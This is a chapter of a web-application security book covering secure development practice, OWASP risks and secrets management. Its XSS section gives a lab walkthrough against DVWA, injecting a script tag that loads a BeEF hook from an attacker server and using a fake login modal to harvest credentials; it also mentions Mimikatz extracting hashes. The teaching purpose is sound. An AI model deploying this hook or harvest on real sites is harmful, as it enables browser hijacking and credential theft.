# Web Applications {#web-applications}

![10,000' view of Web Application Security](images/10000WebApp.gif)

## Development Practices

Let us look at some of the practices we can use as developers to lift the level of security within our software.

### Architecture

There are no architects in Scrum. Just Developers. Some of those developers have architect qualities. They like to step back often to see the bigger picture and understand the interactions between the components and the people using the software. Including every aspect to do with the end product, the people intending to use it and the risks.

Agile architecture does a little design up front in collaboration with the team and everyone that has a vested interest. Agile architecture is not siloed, because it is part of development, just as analysing requirements and testing. It is all done in parallel.

So, we do not really separate the discipline of architecture from a software developer that excels at doing what a traditional architect does as well as engineering. An architect is essentially an extreme version of the 'T' shaped developer. They have very broad knowledge and skill bases, with multiple deep specialities.  
Another defining factor that sets the architect apart is their ability to translate effectively between the most technical people on a project and the least technical. I like to think of them as the people that spend a lot of time riding the elevator of a high rise building. Most technical people toward the bottom of the building and least technical people at the top. The architect spends time on each level taking what he/she has learnt from all the other levels, then translating and applying it to the specific level.

&nbsp;

### Security Test-Driven Development (STDD) {#web-applications-development-practices-security-test-driven-development}

![](images/red_green_refactor.jpg)

There are three aspects I would like to focus on here. You can simply continue to use your existing automated test suites and frameworks. All you have to do is:

1. Add a **security focused test API** into the mix of your existing automated acceptance test suites.  
 Your chosen (language specific) BDD framework of choice, putting legs to your test conditions with automatable "[Given, When, Thens](http://blog.binarymist.net/2012/03/24/how-to-optimise-your-testing-effort/#planningTheTestEffort)".
2. If you are using NodeJS and have not already got your tests running as part of a CI build or pre-commit hook, check out the Consuming Free and Open Source [Tooling](#web-applications-countermeasures-consuming-free-and-open-source-tooling) section for some info on how to set this up
3. Add **security focused BDD/TDD/ATDD** tests.
 This is the same amount of work as any other automated TDD, but it has the huge benefit of bringing the finding of security faults from where it is very expensive to fix:  

    ![](images/CostOfChange.png)  

    to where it is the cheapest possible place to fix:

    ![](images/CostOfChange-WithSTDD.png)  

&nbsp;

1. Continuing No. 1 from above: [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) (which also comes [pre-installed on Kali Linux](http://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#zap) ) is a particularly useful tool for SBDD and regression testing. Because it not only provides a manual tool similar to the likes of Burp Suite + with many other features. ZAP also has the ability to run as a HTTP proxy:
    1. You can run ZAP manually then through the menu Tools -> Options... -> API turn the HTTP API on
    2. Run ZAP from the command line using the -daemon flag
    
        {linenos=off}
            owasp-zap -daemon

    You can then access the API like this:
    
    {linenos=off,lang=bash}
       curl http://localhost:8080 # Providing ZAP is listening on port 8080

  
    This allows us to within our Behavioural, Acceptance tests, send requests programmatically directly to the ZAP HTTP API to do what ever we could do manually with the tool against the System Under Test (SUT).
 You can of course use Selenium 2 (WebDriver) also to drive browser tests and in parallel. I discussed this in ["Automating Specification by Example"](http://blog.binarymist.net/2014/02/22/automating-specification-by-example-for-net/#scope).

    The ZAP API can be accessed directly or by any of the following client implementations:

    * Node.JS (by way of [zaproxy](https://www.npmjs.com/package/zaproxy))
    * Python
    * PHP
    * Ruby
    * .Net [write-up](http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta), [source](https://github.com/gustavorhm/ZapPenTester). It is easy to see how the API is started and used [here](https://github.com/gustavorhm/ZapPenTester/blob/master/ZAPPenTester/Zap.cs).  
 There is also the [OWASP Secure TDD Project](https://www.owasp.org/index.php/OWASP_Secure_TDD_Project). A .Net solution. This project appears to either be abandoned or just very low activity. Feel free to offer to help though if you are a .Net developer. I am not sure I agree with one of the opening statements: "they need to cover all tests prior development". The approach that I would take would be to write some specification (test), execute it, (red) -> Write the smallest amount of code possible to make it pass (green) -> Add to the specification (test)(refactor). As you can see that is your red->green->refactor loop, with the smallest amount possible for each iteration.
    * Java. A couple of client projects useful for seeing how to use the ZAP API: [zap-webdriver](https://github.com/continuumsecurity/zap-webdriver), [bdd-security](https://github.com/continuumsecurity/bdd-security)

    For getting started with OWASP ZAPs API check the:

    * [regression testing](https://code.google.com/p/zaproxy/wiki/SecRegTests)
    * [API details](https://code.google.com/p/zaproxy/wiki/ApiDetails)

2. Continuing No. 2 from above: This is adding another aspect to your existing TDD/BDD thought process. Instead of the business waiting until go-live before contracting the experts to beat up your system. Then tell you **your security sucks**. We take a proactive approach and move a lot of the effort traditionally performed at go-live **up front**, where you yourself as the developer can test and fix. Thus saving embarrassment and the business a lot of money.  
BSIMM has some good [guidance on security testing](https://www.bsimm.com/online/ssdl/st/)

What is so good about STDD and SBDD, is that it roles up Specifications, Design, Implementation and Verification all into one process. Thus working toward delivering each increment that is truly ["Done"](http://blog.binarymist.net/2013/03/02/how-to-increase-software-developer-productivity/#definitionOfDone). Driving development with tests is not about testing right? It is about creating code that is testable. Testable code is inherently well designed and gives us the ability to reason about the state at any given time.  
OpenSSL Heartbleed and Apples Goto Fail could have been prevented if (S)TDD was used. Check out Mike Bland's [excellent study and POC](http://martinfowler.com/articles/testing-culture.html).

<!--- Other Resources: http://www.continuumsecurity.net/services.html#testing -->

&nbsp;

### Hand-crafted Penetration Testing

Sometimes known as "gorilla testing".

As previously discussed, this can be costly when performed late in a projects life cycle, so by automating as much as possible, including high level scans which help to identify starting points to attack, it leaves the developers to do what they do best...

Get creative.

There is no reason why developers can not take a good chunk of the manual penetration testing effort on as part of their daily development practices. In fact in most teams I have lead, this has been exactly how we have worked. The gorilla testing needs to be performed in parallel with the PBIs in the Scrum Backlog as developers pull them into Work I Progress (WIP).

Some developers have an inquisitiveness about how their work can be exploited, so it is important to have at least a none zero number of developers with a security focus within each team to:

1. Take the lead on the security front
2. Mentor and pass on their knowledge and passion to others

BSIMM again has some [good guidance](https://www.bsimm.com/online/deployment/pt/) on hands on penetration testing.

&nbsp;

### Code Review

If we can not get the simple things right like [Coding standards and conventions](http://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/) to help remove some of the "wild west" attitudes and behaviours, then how will we ever get the complicated things right? The whole team needs to abide by the standards, conventions and guidelines.

[Callback Hell Alternatives](http://blog.binarymist.net/2014/07/26/node-js-asynchronicity-and-callback-nesting/) for example.

Manual and Automated.

Check out the [BSIMM Code Review](https://www.bsimm.com/online/ssdl/cr/) for some good ideas.

#### Why? {#web-applications-development-practices-code-review-why}

Because when humans are in creative mode, we often struggle to see the defects in our own creation. That is why tightly knit teams with high morale (as discussed in the people chapter under the "Morale, Productivity and Engagement Killers" sections) are a force to be reckoned with. We are all watching each others backs. We are good at seeing faults in others and their creations. That is why we really do need each other. Never underestimate this blindness in us all and that we have a very powerful mitigation tool in the team. Use it.

#### Linting, Static Analysis

Start with the likes of JSHint. There are lots of other good tooling options.

Techniques and tools to assist with automating

* [https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis](https://wiki.mozilla.org/Security/B2G/JavaScript_code_analysis)
* [JSPrime](https://www.youtube.com/watch?v=Vk5SPGpqiLc) Security focused

#### Dynamic Analysis

Tooling is still immature here. We have got a way to go, but lets start getting our feet wet.

* [Titanium Code Processor](https://theoreticalideations.com/tag/titanium-code-processor/)
* [Slide Deck](https://speakerdeck.com/ariya/dynamic-code-analysis-for-javascript)
* [Jalangi](https://www.eecs.berkeley.edu/~gongliang13/jalangi_ff/)

&nbsp;

### Techniques for Asserting Discipline

JavaScript is an inherently flexible and undisciplined language. This quality is a double edged sword. It provides us with extreme power and also allows us to slaughter ourselves. Discipline is very much needed in order to stay safe and be able to reason about our applications as they grow larger.

I have been involved in many JavaScript project rescue missions where a development team can no longer understand what the monster they have created is doing, what state it is in and why? In almost all occasions, the developers on the team do not have a deep understanding of the language and often of any language. Because of this I always try and push the fact that JavaScript developers must do everything they can to understand the language. In most cases this means taking their learning home and getting intimate with JavaScripts beauty.

Because of the distinct lack of discipline within JavaScript (unlike most other languages) I try and bring as much understanding around techniques that can help impose the extra rigour where and when it is needed. The beautiful thing about JavaScript is that when you really need to do something unconventional, you can, but I like to **weigh up the trade-offs** of either approach.

#### Static Type Checking

In JavaScript we need as much help as we can to fail fast. Static type checking gives us this. It also feels like the step before DbC.

* [flow](http://flowtype.org/) looks to be a good option. Providing consumers with the option of introducing type checking progressively and/or to certain parts that make the most sense. Or rather missing parts that require the extra flexibility.


#### Design by Contract (DbC)

Enforcing preconditions, postconditions and invariants in our routines.
That is right, we can even employ this design principle in JavaScript. I wrote about DbC in a [previous post](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#dbc) in regards to usage in .Net.  
In JavaScript, I believe the DbC principle is even more important as part of adding discipline and keeping us on the straight and narrow. I believe DbC is the principle that helps us achieve the [Liskov Substitution Principle](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#lsp), which is the 'L' in the SOLID design mnemonic. These are the offerings I have noticed that provide support:

1. [ristretto-js](https://code.google.com/p/ristretto-js/w/list)
2. [contract-js on NPM](https://www.npmjs.com/package/contracts-js)
  * [contract.js at home](http://www.contractsjs.org/)
3. [contractual on NPM](https://www.npmjs.com/package/contractual)

In many cases you can implement your cross cutting code contracts using AOP. This gets it out of your code, so that it is not in your face.

### Forming Habits

_Todo_

%% Start out the way you want to end.



### Sharpen Your Skills

_Todo_

%% Look at the likes of NodeGoat and other vulnerable apps.




## 1. SSM Asset Identification
Take results from [higher level Asset Identification](#asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:

* Ownership. Similarly as addressed in the VPS chapter, Do not assume that ownership, or at least control of your server(s) is something you will always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that is because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the [Web Application Firewall](#web-applications-countermeasures-waf) section, where AppSensor can help.
* Intellectual property or sensitive information within the code or configuration files such as email addresses and account credentials for the likes of data-stores, syslog servers, monitoring services. We address this in [Management of Application Secrets](#web-applications-identify-risks-management-of-application-secrets)
* Sensitive Client/Customer data.
* Sanity and piece of mind of people within your organisation. Those that are:
  * Well informed
  * Do not cut corners that should not be cut
  * Passionate and driven to be their best
  * Smart
  * Humble yet fearless
  * Recognise technical debt and are professional enough to speak up
  * Engaged and love passing on their knowledge to others are truly an asset.  
  Some of the following risks will threaten the sanity of these people if the countermeasures are not employed.

## 2. SSM Identify Risks
Go through same process as we did at the [top level](#identify-risks), but for Web Application.

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)
* _Todo_ Exploit WebRTC
  * [Part 1](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with.html)
  * [Part 2](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html)

This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities do not change a lot

&nbsp;

![](images/2013OWASPTop10.jpg)

&nbsp;

They were actually very similar 10 years ago.
   
The vulnerabilities that have not changed a lot are:

* No. 1 Injection (and the easiest to fix)
* No. 2 Broken Authentication and Session Management
* No. 3 XSS
* No. 4 Insecure Direct Object References
* No. 5 Security Misconfiguration
* No. 8 Frameworks are helping with CSRF
* No. 9 is new, because we are now consuming a lot more packages without vetting them.

&nbsp;

![](images/OWASPTop10SomeThingsDontChange.jpg)

{pagebreak}

### Lack of Visibility








#### Logging








### Lack of Input Validation and Sanitisation {#web-applications-identify-risks-lack-of-input-validation-and-sanitisation}
![](images/ThreatTags/easy-common-average-severe.png)

#### Buffer Overflows {#web-applications-identify-risks-buffer-overflows}

_Todo_
<!--- https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008 -->

#### Cross-Site Scripting (XSS) {#web-applications-identify-risks-cross-site-scripting}
![](images/ThreatTags/average-verywidespread-easy-moderate.png)

&nbsp;

_Todo_ [Discuss intricacies of XSS](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/4)

&nbsp;

{#wdcnz-demo-1}
![](images/HandsOnHack.png)

The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in chapter 8 People, under [Spear Phishing](#people-identify-risks-spear-phishing). 

Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:

1. Information gathering (probably partly even before you signed the contract with your client)
2. Vulnerability scanning
3. Vulnerability searching

If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.

How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEFs attributes. 

You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).

I> ## Synopsis
I>
I> In this exercise, I have used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.

{icon=bomb}
G> ## The Play
G>
G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspbwa/wiki/UserGuide) and running in your lab.
G>
G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
G>
G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.
G>
G> Open another browser tab and log-in to the DVWA.
G>
G> Browse to "XSS stored".
G>
G> Enter some text in the Name field and some text in the Message field.
G> 
G> Enable foxy proxy so that your request goes to the same port that burp suite is going to be listening on.
G>
G> Fire up burp.
G>
G> Back in the DVWA send your request by clicking on the Sign Guest-book button.
G>
G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
G>
G> You can disable FoxyProxy now too.
G>
G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
G>
G> If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
G>
G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
G>
G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.
G>
G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  

#### SQLi {#web-applications-identify-risks-sqli}

![](images/HandsOnHack.png)

 One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists.  
 Lets hammer this home some more.

#### Command Injection {#web-applications-identify-risks-command-injection}

![](images/HandsOnHack.png)

_Todo_

%% NodeJS https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-identify-risks-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-identify-risks-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-identify-risks-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-identify-risks-xslt-injection}

_Todo_

#### XML Injection {#web-applications-identify-risks-xml-injection}

_Todo_

### Management of Application Secrets {#web-applications-identify-risks-management-of-application-secrets}

* Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.
* Passwords and/or their hashes travelling over the network. Also see the [Wire Inspecting](#network-identify-risks-wire-inspecting) section in the [Network](#network) chapter.

#### Data-store Compromise
![](images/ThreatTags/difficult-common-average-moderate.png)

The reason I've tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.

There are many examples of this happening on a daily basis to millions of users. The Ashley Madison debacle is a good example. Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, provide discretion and anonymity. 

"_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"

"_We worked hard to make a fully undetectable attack, then got in and found nothing to bypass.... Nobody was watching. No security. Only thing was segmented network. You could use Pass1234 from the internet to VPN to root on all servers._”

"_Any CEO who isn’t vigilantly protecting his or her company’s assets with systems designed to track user behavior and identify malicious activity is acting negligently and putting the entire organization at risk. And as we’ve seen in the case of Ashley Madison, leadership all the way up to the CEO may very well be forced out when security isn’t prioritized as a core tenet of an organization._"

> Dark Reading

Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 

Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected.

### Lack of Authentication {#web-applications-identify-risks-lack-of-authentication}

_Todo_  
_Todo_  
...

### Cryptography on the Client (AKA Untrusted Crypto) {#web-applications-identify-risks-cryptography-on-the-client}

* Untrusted Crypto (Web Crypto API). Is this really a good idea? _Todo_
  * [https://www.hackinparis.com/node/309](https://www.hackinparis.com/node/309)
  * [http://tonyarcieri.com/whats-wrong-with-webcrypto](http://tonyarcieri.com/whats-wrong-with-webcrypto)

### Consuming Free and Open Source {#web-applications-identify-risks-consuming-free-and-open-source}
![](images/ThreatTags/average-widespread-difficult-moderate.png)

This is where [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) of the 2013 OWASP Top 10 comes in.

We are consuming far more free and open source libraries than we have ever before. Much of the code we are pulling into our projects is never intentionally used, but is still adding surface area for attack. Much of it:

* Is not thoroughly tested (for what it should do and what it should not do). We are often relying on developers we do not know a lot about to have not introduced defects. As I discussed in the [Code Review](#web-applications-development-practices-code-review-why) section, most developers are more focused on building than breaking, they do not even see the defects they are introducing.
* Is not reviewed evaluated. That is right, many of the packages we are consuming are created by solo developers with a single focus of creating and little to no focus of how their creations can be exploited. Even some teams with a security hero are not doing a lot better.
* Is created by amateurs that could and do include vulnerabilities. Anyone can write code and publish to an open source repository. Much of this code ends up in our package management repositories which we consume.
* Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner that our commercial software does.

Many vulnerabilities can hide in these external dependencies. It is not just one attack vector any more, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you do not find and deal with them, I can assure you, someone else will.

Running install or any scripts from non local sources without first downloading them and inspecting can destroy or modify your and any other reachable systems, send sensitive information to an attacker, or any number
of other criminal activities.

## 3. SSM Countermeasures

* [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)

### Lack of Visibility

_Todo_

#### Logging {#web-applications-countermeasures-lack-of-visibility-logging}

_Todo_

### Lack of Input Validation and Sanitisation {#web-applications-countermeasures-lack-of-input-validation-and-sanitisation}
![](images/ThreatTags/PreventionAVERAGE.png)

* All user input should be escaped
* Ideally user input should conform to white lists
* Database accounts (in fact all accounts) should use least privilege
* I cover input sanitisation [here](http://blog.binarymist.net/2012/11/04/sanitising-user-input-from-browser-part-1/)
* Well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern

#### Buffer Overflows {#web-applications-countermeasures-buffer-overflows}

_Todo_

#### Cross-Site Scripting (XSS) {#web-applications-countermeasures-cross-site-scripting}

_Todo_: [Take this further](https://github.com/binarymist/HolisticInfoSec-For-WebDevelopers/issues/4)

#### SQLi {#web-applications-countermeasures-sqli}

There are a few options here:

* Use prepared statements and/or parameterised queries
* Consider using Stored Procedures
* Read up on the [OWASP SQLi Prevention Cheat Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

#### Command Injection {#web-applications-countermeasures-command-injection}

On top of the points mentioned above under [Lack of Input Validation and Sanitisation](#web-applications-countermeasures-lack-of-input-validation-and-sanitisation), 
[This article](http://www.golemtechnologies.com/articles/shell-injection) is quite good.

%% Command Injection in NodeJS: https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js

#### LDAP Injection {#web-applications-countermeasures-ldap-injection}

_Todo_

#### XPath Injection {#web-applications-countermeasures-xpath-injection}

_Todo_

#### XQuery Injection {#web-applications-countermeasures-xquery-injection}

_Todo_

#### XSLT Injection {#web-applications-countermeasures-xslt-injection}

_Todo_

#### XML Injection {#web-applications-countermeasures-xml-injection}

_Todo_

### Management of Application Secrets {#web-applications-countermeasures-management-of-application-secrets}

Secure password management within applications is a case of doing what you can, often relying on obscurity and leaning on other layers of defence to make it harder for compromise. Like many of the layers already discussed in the previous chapters.

[Find out](#network-countermeasures-wire-inspecting) how secret the data that is supposed to be secret that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you will still be in good standing.

![](images/DefenceInDepth.png)

You may read in many places that having data-store passwords and other types of secrets in configuration files in clear text is an insecurity that must be addressed. Then when it comes to mitigation, there seems to be a few techniques for helping, but most of them are based around obscuring the secret rather than securing it. Essentially just making discovery a little more inconvenient like using an alternative port to SSH to other than the default of 22. Maybe surprisingly though, obscurity does significantly reduce the number of opportunistic type attacks from bots and script kiddies.

#### Store Configuration in Configuration files
![](images/ThreatTags/PreventionAVERAGE.png)

Do not hard code passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.

Here are some examples using the node-config module.

##### node-config

is a fully featured, well maintained configuration package that I have used on a good number of projects.

To install: From the command line within the root directory of your NodeJS application, run:

`npm install node-config --save`

Now you are ready to start using node-config. An example of the relevant section of an `app.js` file may look like the following:

{title="app.js", linenos=off, lang=JavaScript}
    // Due to bug in node-config the if statement is required before config is required
    // https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');


Where ever you use node-config, in your routes for example:

{title="home.js", linenos=off, lang=JavaScript}
    var config = require('config');
    var nodemailer = require('nodemailer');
    var enquiriesEmail = config.enquiries.email;
    
    // Setting up email transport.
    var transporter = nodemailer.createTransport({
       service: config.enquiries.service,
       auth: {
          user: config.enquiries.user,
          pass: config.enquiries.pass // App specific password.
       }
    });


A good collection of different formats can be used for the config files: `.json`, `.json5`, `.hjson`, `.yaml`, `.js`, `.coffee`, `.cson`, `.properties`, `.toml`

There is a specific [file loading order](https://github.com/lorenwest/node-config/wiki/Configuration-Files) which you specify by file naming convention, which provides a lot of flexibility and which caters for:

* Having multiple instances of the same application running on the same machine
* The use of short and full host names to mitigate machine naming collisions
* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example: `development`, `production`, `staging`, `whatever`.
* Using and creating config files which stay out of source control. These config files have a prefix of `local`. These files are to be managed by external configuration management tools, build scripts, etc. Thus providing even more flexibility about where your sensitive configuration values come from.

{pagebreak}

The config files for the required attributes used above may take the following directory structure:

{title="directory layout", linenos=off, lang=JavaScript}
    OurApp/
    |
    +-- config/
    |  |
    |  +-- default.js (usually has the most in it)
    |  |
    |  +-- devbox1-development.js
    |  |
    |  +-- devbox2-development.js
    |  |
    |  +-- stagingbox-staging.js
    |  |
    |  +-- prodbox-production.js
    |  |
    |  +-- local.js (creted by build)
    |
    +-- routes
    |  |
    |  +-- home.js
    |  |
    |  +-- ...
    |
    +-- app.js (entry point)
    |
    +-- ...


The contents of the above example configuration files may look like the following:

{title="default.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Supported services:
          // https://github.com/andris9/nodemailer-wellknown#supported-services
          // supported-services actually use the best security settings by default.
          // I tested this with a wire capture, because it is always the most fool proof way.
          service: 'FastMail',
          email: 'yourusername@fastmail.com',
          user: 'yourusername',
          pass: null
       }
       // Lots of other settings.
       // ...
    }

{title="devbox1-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox1
          pass: 'D[6F9,4fM6?%2ULnirPVTk#Q*7Z+5n' // App specific password.
       }
    }

{title="devbox2-development.js", linenos=off, lang=JavaScript}
    module.exports = {
       enquiries: {
          // Test password for developer on devbox2
          pass: 'eUoxK=S9<,`@m0T1=^(EZ#61^5H;.H' // App specific password.
       }
    }

{title="stagingbox-staging.js", linenos=off, lang=JavaScript}
    {}

{title="prodbox-production.js", linenos=off, lang=JavaScript}
    {}

{title="local.js", linenos=off, lang=JavaScript}
    // Build creates this file.
    module.exports = {
       enquiries: {
          // Password created by the build.
          pass: '10lQu$4YC&x~)}lUF>3pm]Tk>@+{N]' // App specific password.
       }
    }

The [Logging](#web-applications-countermeasures-lack-of-visibility-logging) section shows more configuration options to provide a slightly bigger picture.

node-config also:

* Provides command line overrides, thus allowing you to override configuration values at application start from command
* Allows for the overriding of environment variables with [custom environment variables](https://github.com/lorenwest/node-config/wiki/Environment-Variables#custom-environment-variables) from a `custom-environment-variables.json` file

&nbsp;

Encrypting/decrypting credentials in code may provide some obscurity, but not much more than that.  
There are different answers for different platforms. None of which provide complete security, if there is such a thing, but instead focusing on different levels of obscurity.

##### Windows 

**Store database credentials as a Local Security Authority (LSA) secret** and create a DSN with the stored credential. Use a SqlServer [connection string](https://www.owasp.org/index.php/Configuration#Secure_connection_strings) with `Trusted_Connection=yes`

The hashed credentials are stored in the SAM file and the registry. If an attacker has physical access to the storage, they can easily copy the hashes if the machine is not running or can be shut-down. The hashes can be sniffed [from the wire](#network-identify-risks-wire-inspecting) in transit. The hashes can be pulled from the running machines memory (specifically the Local Security Authority Subsystem Service (`LSASS.exe`)) using tools such as Mimikatz, WCE, hashdump or fgdump. An attacker generally only needs the hash. Trusted tools like psexec take care of this for us. All discussed in my ["0wn1ng The Web"](https://speakerdeck.com/binarymist/0wn1ng-the-web-at-www-dot-wdcnz-dot-com) presentation. 

&nbsp;

**Encrypt sections** of a web, executable, machine-level, application-level configuration files with `aspnet_regiis.exe` with the `-pe` option and name of the configuration element to encrypt and the configuration provider you want to use. Either `DataProtectionConfigurationProvider` (uses DPAPI) or `RSAProtectedConfigurationProvider` (uses RSA). the `-pd` switch is used to decrypt or programatically:  
`string connStr = ConfigurationManager.ConnectionString["MyDbConn1"].ToString();`

Of course there is a problem with this also. DPAPI uses LSASS, which again an attacker can extract the hash from its memory. If the `RSAProtectedConfigurationProvider` has been used, a key container is required. Mimikatz will force an export from the key container to a `.pvk` file.
Which can then be [read](http://stackoverflow.com/questions/7332722/export-snk-from-non-exportable-key-container) using OpenSSL or tools from the `Mono.Security` assembly.

&nbsp;

I have looked at a few other ways using `PSCredential` and `SecureString`. They all seem to rely on DPAPI which as mentioned uses LSASS which is open for exploitation.

&nbsp;

[**Credential Guard**](https://technet.microsoft.com/en-us/library/mt483740) and Device Guard leverage virtualisation-based security. By the look of it still using LSASS. Bromium have partnered with Microsoft and coined it Micro-virtualization. The idea is that every user task is isolated into its own micro-VM. There seems to be some confusion as to how this is any better. Tasks still need to communicate outside of their VM, so what is to stop malicious code doing the same? I have seen lots of questions but no compelling answers yet. Credential Guard must run on physical hardware directly. Can not run on virtual machines. This alone rules out many deployments.

"_Bromium vSentry transforms information and infrastructure protection with a revolutionary new architecture that isolates and defeats advanced threats targeting the endpoint through web, email and documents_"

"_vSentry protects desktops without requiring patches or updates, defeating and
automatically discarding all known and unknown malware, and eliminating the need for costly remediation._"

This is marketing talk. Please don't take this literally.

"_vSentry empowers users to access whatever information they need from any network, application or website, without risk to the enterprise_"

"_Traditional security solutions rely on detection and often fail to block targeted attacks which use unknown “zero day” exploits. Bromium uses hardware enforced isolation to stop even “undetectable” attacks without disrupting the user._"

> Bromium

"_With Bromium micro-virtualization, we now have an answer: A desktop that is utterly secure and a joy to use_"

> Bromium

These seem like bold claims.

Also worth considering is that Microsofts new virtualization-based security also relies on UEFI Secure Boot, which has been proven [insecure](http://www.itworld.com/article/2707547/endpoint-protection/researchers-demo-exploits-that-bypass-windows-8-secure-boot.html).

##### Linux

**Containers** also help to provide some form of isolation. Allowing you to only have the user accounts to do what is necessary for the application.

I usually use a **deployment tool that also changes the permissions** and ownership of the files involved with the running web application to a single system user, so unprivileged users can not access the web applications files at all. The [deployment script](https://github.com/binarymist/DeploymentTool) is executed over SSH in a remote shell. Only specific commands on the server are allowed to run and a very limited set of users have any sort of access to the machine. If you are using Linux Containers then you can reduce this even more if it is not already.

